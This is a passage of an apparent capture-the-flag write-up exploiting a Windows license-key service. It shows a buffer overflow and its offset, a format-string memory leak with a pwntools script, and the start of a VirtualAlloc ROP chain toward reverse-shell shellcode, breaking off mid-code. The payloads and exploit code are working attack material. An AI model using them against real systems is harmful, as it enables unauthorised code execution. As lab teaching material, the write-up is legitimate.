+<img alt="image-20250821165510719" class="include_image" loading="lazy" src="/img/image-20250821165510719.png"/>
+</picture>
+<p>If it matches, it returns 1, else 0.</p>
+<p><code class="language-plaintext highlighter-rouge">log_key</code> (0x1400015b0) is responsible for base64-decoding the last section, and printing a message. The decompile looks like:</p>
+<picture>
+<source srcset="/img/image-20250821170944856.webp" type="image/webp"/>
+<img alt="image-20250821170944856" class="include_image" loading="lazy" src="/img/image-20250821170944856.png"/>
+</picture>
+<p>The decompile is clearly missing some things, but it’s enough to get the general idea. I didn’t dive too deep into this, other than to see it’s building the message to send back, which eventually looks like:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Checking key: 100-FE9A1-500-A270-0102, Comment: Standard License
+</span></code></pre></div></div>
+<p>I will note a potential format string vulnerabiltiy at line 29 in the image above, where it’s calling <code class="language-plaintext highlighter-rouge">snprintf</code> with three args (which I’ll abuse <a href="#memory-leak">shortly</a>).</p>
+<h3 id="buffer-overflow">Buffer Overflow</h3>
+<h4 id="identify">Identify</h4>
+<p>I’ll start <code class="language-plaintext highlighter-rouge">dev_keysvc.exe</code> in x64dbg and base64-encode a bunch of “A”s to get a long buffer:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python <span class="nt">-c</span> <span class="s2">"print('A' * 500)"</span> | <span class="nb">base64</span> <span class="nt">-w0</span>
+<span class="go">QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEK
+</span></code></pre></div></div>
+<p>I’ve already noted <a href="#option-1">above</a> that the stuff after the last “-“ doesn’t matter as far as checksum, so I’ll try just sending this in:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+1
+Enter a key: 100-FE9A1-500-A270-0102-QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEK
+Valid key format
+Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+</span></code></pre></div></div>
+<p>No crash, and the menu comes back. However, when I go to “Activate key”, it just hangs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+2
+</span></code></pre></div></div>
+<p>In x64dbg, it’s at a <code class="language-plaintext highlighter-rouge">ret</code> (mark 1):</p>
+<p><a href="/img/image-20250821163638315.png"><img alt="image-20250821163638315" src="/img/image-20250821163638315.png"/><em>Click for full size image</em></a></p>
+<p>At mark 2 it’s showing an <code class="language-plaintext highlighter-rouge">EXCEPTION_ACCESS_VIOLATION</code>. At mark 3, the top of the stack, the return address has been overwritten with all “A”s. RIP is at the <code class="language-plaintext highlighter-rouge">ret</code> for the <code class="language-plaintext highlighter-rouge">log_key</code> function, and this is crashing because AAAAAAAA isn’t a valid address to load into RIP.</p>
+<h4 id="calculate-offset">Calculate Offset</h4>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">gdb</code> and <code class="language-plaintext highlighter-rouge">peda</code> to get access to <code class="language-plaintext highlighter-rouge">pattern_create</code>, and make a 500 character pattern:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>gdb <span class="nt">-q</span> <span class="nt">-batch</span> <span class="nt">-ex</span> <span class="s2">"pattern_create 500"</span> <span class="nt">-ex</span> <span class="s2">"quit"</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s2">"'"</span> <span class="nt">-f2</span> | <span class="nb">base64</span> <span class="nt">-w0</span>
+<span class="go">QUFBJUFBc0FBQkFBJEFBbkFBQ0FBLUFBKEFBREFBO0FBKUFBRUFBYUFBMEFBRkFBYkFBMUFBR0FBY0FBMkFBSEFBZEFBM0FBSUFBZUFBNEFBSkFBZkFBNUFBS0FBZ0FBNkFBTEFBaEFBN0FBTUFBaUFBOEFBTkFBakFBOUFBT0FBa0FBUEFBbEFBUUFBbUFBUkFBb0FBU0FBcEFBVEFBcUFBVUFBckFBVkFBdEFBV0FBdUFBWEFBdkFBWUFBd0FBWkFBeEFBeUFBekElJUElc0ElQkElJEElbkElQ0ElLUElKEElREElO0ElKUElRUElYUElMEElRkElYkElMUElR0ElY0ElMkElSEElZEElM0ElSUElZUElNEElSkElZkElNUElS0ElZ0ElNkElTEElaEElN0ElTUElaUElOEElTkElakElOUElT0Ela0ElUEElbEElUUElbUElUkElb0ElU0ElcEElVEElcUElVUElckElVkEldEElV0EldUElWEEldkElWUEld0ElWkEleEEleUElekFzJUFzc0FzQkFzJEFzbkFzQ0FzLUFzKEFzREFzO0FzKUFzRUFzYUFzMEFzRkFzYkFzMUFzR0FzY0FzMkFzSEFzZEFzM0FzSUFzZUFzNEFzSkFzZkFzNUFzS0FzZ0FzNkEK
+</span></code></pre></div></div>
+<p>I’m using <code class="language-plaintext highlighter-rouge">cut</code> to remove the ‘ from each side, and the <code class="language-plaintext highlighter-rouge">base64</code> to encode the result.</p>
+<p>I’ll restart the server, send the key, and then activate it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span>nc 10.0.0.202 4141
+<span class="go">Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+1
+Enter a key: 100-FE9A1-500-A270-0102-QUFBJUFBc0FBQkFBJEFBbkFBQ0FBLUFBKEFBREFBO0FBKUFBRUFBYUFBMEFBRkFBYkFBMUFBR0FBY0FBMkFBSEFBZEFBM0FBSUFBZUFBNEFBSkFBZkFBNUFBS0FBZ0FBNkFBTEFBaEFBN0FBTUFBaUFBOEFBTkFBakFBOUFBT0FBa0FBUEFBbEFBUUFBbUFBUkFBb0FBU0FBcEFBVEFBcUFBVUFBckFBVkFBdEFBV0FBdUFBWEFBdkFBWUFBd0FBWkFBeEFBeUFBekElJUElc0ElQkElJEElbkElQ0ElLUElKEElREElO0ElKUElRUElYUElMEElRkElYkElMUElR0ElY0ElMkElSEElZEElM0ElSUElZUElNEElSkElZkElNUElS0ElZ0ElNkElTEElaEElN0ElTUElaUElOEElTkElakElOUElT0Ela0ElUEElbEElUUElbUElUkElb0ElU0ElcEElVEElcUElVUElckElVkEldEElV0EldUElWEEldkElWUEld0ElWkEleEEleUElekFzJUFzc0FzQkFzJEFzbkFzQ0FzLUFzKEFzREFzO0FzKUFzRUFzYUFzMEFzRkFzYkFzMUFzR0FzY0FzMkFzSEFzZEFzM0FzSUFzZUFzNEFzSkFzZkFzNUFzS0FzZ0FzNkEK
+Valid key format
+Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+2
+</span></code></pre></div></div>
+<p>At x64dbg it crashes with the pattern at the top of RSP:</p>
+<picture>
+<source srcset="/img/image-20250821164408163.webp" type="image/webp"/>
+<img alt="image-20250821164408163" class="include_image" loading="lazy" src="/img/image-20250821164408163.png"/>
+</picture>
+<p>I’ll throw that into <code class="language-plaintext highlighter-rouge">pattern_offset</code> and see it’s at 88 bytes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>gdb <span class="nt">-q</span> <span class="nt">-batch</span> <span class="nt">-ex</span> <span class="s2">"pattern_offset AAKAAgAA"</span> <span class="nt">-ex</span> <span class="s2">"quit"</span>
+<span class="go">AAKAAgAA found at offset: 88
+</span></code></pre></div></div>
+<h4 id="validate-offset">Validate Offset</h4>
+<p>I’ll generate a payload that’s base64-encoded 88 “A”s and then eight “B”s:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">88</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">).</span><span class="nf">decode</span><span class="p">()</span>
+<span class="go">'QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJCQkJCQkJC'
+</span></code></pre></div></div>
+<p>I’ll restart the debugger one more time and send it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc 10.0.0.202 4141
+<span class="go">Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+1
+Enter a key: 100-FE9A1-500-A270-0102-QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJCQkJCQkJC
+Valid key format
+Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+2
+Checking key: 100-FE9A1-500-A270-0102, Comment: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></code></pre></div></div>
+<p>At the crash, there are eight “B”s at the top of the stack:</p>
+<picture>
+<source srcset="/img/image-20250821164801994.webp" type="image/webp"/>
+<img alt="image-20250821164801994" class="include_image" loading="lazy" src="/img/image-20250821164801994.png"/>
+</picture>
+<p>That’s control over RIP.</p>
+<h3 id="memory-leak">Memory Leak</h3>
+<h4 id="details">Details</h4>
+<p>I noted above that there’s an unsafe call to <code class="language-plaintext highlighter-rouge">snprintf</code> in the <code class="language-plaintext highlighter-rouge">log_key</code> function:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_snprintf</span><span class="p">(</span><span class="n">keyStringBuffer</span><span class="p">,</span><span class="mh">0xff2</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">keyData</span><span class="p">);</span>
+</code></pre></div></div>
+<p>It should take an output buffer, a length, a format string, and then one or more variables. By using <code class="language-plaintext highlighter-rouge">keyData</code> as the format string, I can potentially inject format strings in the input that will be evaluated.</p>
+<p>At the time of the <code class="language-plaintext highlighter-rouge">snprintf</code> call, the three args are in RCX (output buffer), RDX (length), and R8 (format string):</p>
+<picture>
+<source srcset="/img/image-20250821173753685.webp" type="image/webp"/>
+<img alt="image-20250821173753685" class="include_image" loading="lazy" src="/img/image-20250821173753685.png"/>
+</picture>
+<p>If I were to get a “%p” into the format string, it would try to read the memory at the next arg, R9. That just happens to have a constant address in the binary from other activity. So if I can leak that, I can know where the full binary is loaded into memory.</p>
+<h4 id="poc">POC</h4>
+<p>To test this theory, I’ll make a key that starts with <code class="language-plaintext highlighter-rouge">%p</code> and still meets the rest of the criteria for a valid key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">key</span> <span class="o">=</span> <span class="sh">'</span><span class="s">%p -AAAAA-BBB-CCCC-____-U3RhbmRhcmQgTGljZW5zZQ==</span><span class="sh">'</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">sum</span><span class="p">([</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">key</span><span class="p">[:</span><span class="mh">0x13</span><span class="p">]</span> <span class="k">if</span> <span class="n">c</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="p">])</span>
+<span class="go">252
+</span></code></pre></div></div>
+<p>On submitting and activating that, it dumps a memory address:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc 10.0.0.202 4141
+<span class="go">Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+1
+Enter a key: %p -AAAAA-BBB-CCCC-0252-U3RhbmRhcmQgTGljZW5zZQ==
+Valid key format
+Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+2
+Checking key: 00007FF75A7F0660 -AAAAA, Comment: Standard License
+</span></code></pre></div></div>
+<p>Not only is it a memory address, but it matches what is in the x64dbg display above as the address for “Checking key: “.</p>
+<h4 id="script">Script</h4>
+<p>I’ll start an exploit script that will execute this leak and get the module base address. The memory map shows the module is loaded at 0x00007FF75A7D0000. Subtracting off the leaked address, it’s at an offset of 0x20660:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">hex</span><span class="p">(</span><span class="mh">0x00007FF75A7F0660</span> <span class="o">-</span> <span class="mh">0x00007FF75A7D0000</span><span class="p">)</span>
+<span class="go">'0x20660'
+</span></code></pre></div></div>
+<p>The script so far will take an IP, connect to it, make a key to leak the memory address, and calculate the module base address:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># /// script
+# requires-python = "&gt;=3.11"
+# dependencies = [
+#     "pwntools",
+# ]
+# ///
+</span><span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="n">remote</span>
+
+
+<span class="k">def</span> <span class="nf">build_valid_key</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">serial</span><span class="p">,</span> <span class="n">comment</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="n">serial</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="n">serial</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">-</span><span class="sh">'</span>
+    <span class="n">key_start</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="nb">id</span><span class="si">:</span><span class="mi">03</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">serial</span><span class="si">}</span><span class="sh">"</span>
+    <span class="n">checksum</span> <span class="o">=</span> <span class="nf">sum</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">key_start</span> <span class="k">if</span> <span class="n">c</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">encoded_comment</span> <span class="o">=</span> <span class="nf">b64encode</span><span class="p">(</span><span class="n">comment</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span>
+    <span class="k">return</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">key_start</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">checksum</span><span class="si">:</span><span class="mi">04</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">encoded_comment</span><span class="si">}</span><span class="sh">"</span>
+
+
+<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;ip&gt;</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">4141</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Exit</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="nf">build_valid_key</span><span class="p">(</span><span class="sh">"</span><span class="s">%p </span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">AAAAA-BBB-CCCC</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">test</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">key: </span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Exit</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">leak_addr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">readline</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)[</span><span class="mi">2</span><span class="p">].</span><span class="nf">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[+] Leaked string address: 0x</span><span class="si">{</span><span class="n">leak_addr</span><span class="si">:</span><span class="n">x</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">base_addr</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="mh">0x20660</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[+] Base address: 0x</span><span class="si">{</span><span class="n">base_addr</span><span class="si">:</span><span class="n">x</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+<p>The dependencies at the top are added with <code class="language-plaintext highlighter-rouge">uv add --script exploit.py pwntools</code> to set up the virtual env to run with <code class="language-plaintext highlighter-rouge">uv</code> (see my <a href="/cheatsheets/uv#">uv cheatsheet</a>). It works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> exploit.py 10.0.0.202
+<span class="go">Installed 34 packages in 162ms
+[+] Opening connection to 10.0.0.202 on port 4141: Done
+[+] Leaked string address: 0x7ff75a7f0660
+[+] Base address: 0x7ff75a7d0000
+[*] Closed connection to 10.0.0.202 port 4141
+</span></code></pre></div></div>
+<p>It works on the remote target as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> exploit.py 10.129.234.65
+<span class="go">[+] Opening connection to 10.129.234.65 on port 4141: Done
+[+] Leaked string address: 0x7ff6693d0660
+[+] Base address: 0x7ff6693b0000
+[*] Closed connection to 10.129.234.65 port 4141
+</span></code></pre></div></div>
+<h3 id="rop">ROP</h3>
+<h4 id="strategy">Strategy</h4>
+<p>h0mbre has a nice intro on <a href="https://h0mbre.github.io/Creating_Win32_ROP_Chains/">Windows ROP chains</a> that’s worth reading for more details. I’ll follow a similar approach, though the article is about 32-bit where I am working in 64. The strategy is to make the stack executable, and then jump to shellcode in it.</p>
+<p>I’ll want to use a function like <code class="language-plaintext highlighter-rouge">VirtualProtect</code> or <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>. Ghida shows that <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> is already imported making it easier to use:</p>
+<picture>
+<source srcset="/img/image-20250822084401053.webp" type="image/webp"/>
+<img alt="image-20250822084401053" class="include_image" loading="lazy" src="/img/image-20250822084401053.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">VirtualAlloc</code> will:</p>
+<blockquote>
+<p>Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process.</p>
+</blockquote>
+<p>Typically I see <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> used to allocate a block of memory for use, but it can also be used with an already allocated block to change the permissions.</p>
+<p>The <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">docs</a> show that the call is made as:</p>
+<blockquote>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="nf">VirtualAlloc</span><span class="p">(</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>  <span class="n">flProtect</span>
+<span class="p">);</span>
+</code></pre></div> </div>
+</blockquote>
+<p>That means the goal is to set up a ROP chain such that I can call <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> with:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lpAddress: RCX = address on stack
+dwSize: RDX = size of memory region
+flAllocationType: R8 = MEM_COMMIT = 0x1000
+flProtect: R9 = PAGE__EXECUTE_READWRITE = 0x40
+</code></pre></div></div>
+<p>And then a way to jump to the right place in the stack where I put shellcode for a reverse shell.</p>
+<h4 id="gadgets">Gadgets</h4>
+<p>I’ll use <a href="https://github.com/sashs/Ropper">Ropper</a> (<code class="language-plaintext highlighter-rouge">uv tool install ropper</code>) to get ROP gadgets from the binary. I’ll use the <code class="language-plaintext highlighter-rouge">--nocolor</code> flag or else it will mess up my greps.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ropper <span class="nt">--file</span> ./dev_keysvc.exe <span class="nt">--nocolor</span> <span class="o">&gt;</span> ropper.txt
+<span class="go">[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">wc</span> <span class="nt">-l</span> ropper.txt 
+<span class="go">4613 ropper.txt
+</span></code></pre></div></div>
+<p>I’ll also use <code class="language-plaintext highlighter-rouge">ROPgadget</code> as a backup. It returns different gadgets just because picking out what gadgets to show is an art not a science. If I can’t find what I’m looking for with <code class="language-plaintext highlighter-rouge">ropper</code>, it’s worth checking <code class="language-plaintext highlighter-rouge">ROPgadgets</code>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">wc</span> <span class="nt">-l</span> ropgadget.txt
+<span class="go">11084 ropgadget.txt
+</span></code></pre></div></div>
+<h4 id="flprotect">flProtect</h4>
+<p>So when I look for a way to get a static value into R9, I’ll start doing <code class="language-plaintext highlighter-rouge">grep</code> to look for <code class="language-plaintext highlighter-rouge">pop</code>, <code class="language-plaintext highlighter-rouge">mov</code>, and <code class="language-plaintext highlighter-rouge">add</code> instructions like:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>ropper.txt | <span class="nb">grep</span> <span class="s1">'pop r9'</span>
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>ropper.txt | <span class="nb">grep</span> <span class="s1">'mov r9,'</span>
+<span class="go">0x0000000140001f90: mov r9, rbx; mov r8, 0; add rsp, 8; ret; 
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>ropper.txt | <span class="nb">grep</span> <span class="s1">'add r9,'</span>
+<span class="go">0x0000000140002a9c: add byte ptr [rax], al; add byte ptr [rax], al; mov r9d, dword ptr [r10 + r8*4 + 0x30000]; add r9, r10; jmp r9; ret; 
+0x0000000140002a9d: add byte ptr [rax], al; add byte ptr [rdi - 0x75], al; mov word ptr [rdx + 0x30000], es; add r9, r10; jmp r9; ret; 
+0x0000000140002aa4: add byte ptr [rax], al; add eax, dword ptr [rax]; add r9, r10; jmp r9; ret; 
+0x0000000140002a9e: add byte ptr [rax], al; mov r9d, dword ptr [r10 + r8*4 + 0x30000]; add r9, r10; jmp r9; ret; 
+0x0000000140002a9f: add byte ptr [rdi - 0x75], al; mov word ptr [rdx + 0x30000], es; add r9, r10; jmp r9; ret; 
+0x0000000140002aa6: add eax, dword ptr [rax]; add r9, r10; jmp r9; ret; 
+0x0000000140002aa8: add r9, r10; jmp r9; ret; 
+0x0000000140002aa1: mov ecx, dword ptr [rdx + rax*4 + 0x30000]; add r9, r10; jmp r9; ret; 
+0x0000000140002aa0: mov r9d, dword ptr [r10 + r8*4 + 0x30000]; add r9, r10; jmp r9; ret; 
+0x0000000140002aa2: mov word ptr [rdx + 0x30000], es; add r9, r10; jmp r9; ret;
+</span></code></pre></div></div>
+<p>Here the best option is probably moving RBX into R9 if I can find a way to get a value into RBX. There’s a clean gadget for that:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>ropper.txt | <span class="nb">grep</span> <span class="s1">': pop rbx; ret'</span>
+<span class="go">0x00000001400020d9: pop rbx; ret;
+</span></code></pre></div></div>
+<p>So I can use these two gadgets to load a value into R9:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pop_rbx</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x20d9</span><span class="p">)</span>
+<span class="n">mov_r9_rbx</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x1f90</span><span class="p">)</span> <span class="c1"># note also 0s R8 and adds 8 to RSP
+</span>
+<span class="k">def</span> <span class="nf">load_R9</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
+    <span class="sh">"""</span><span class="s">Side effects: R8 = 0, stack moved by 8</span><span class="sh">"""</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
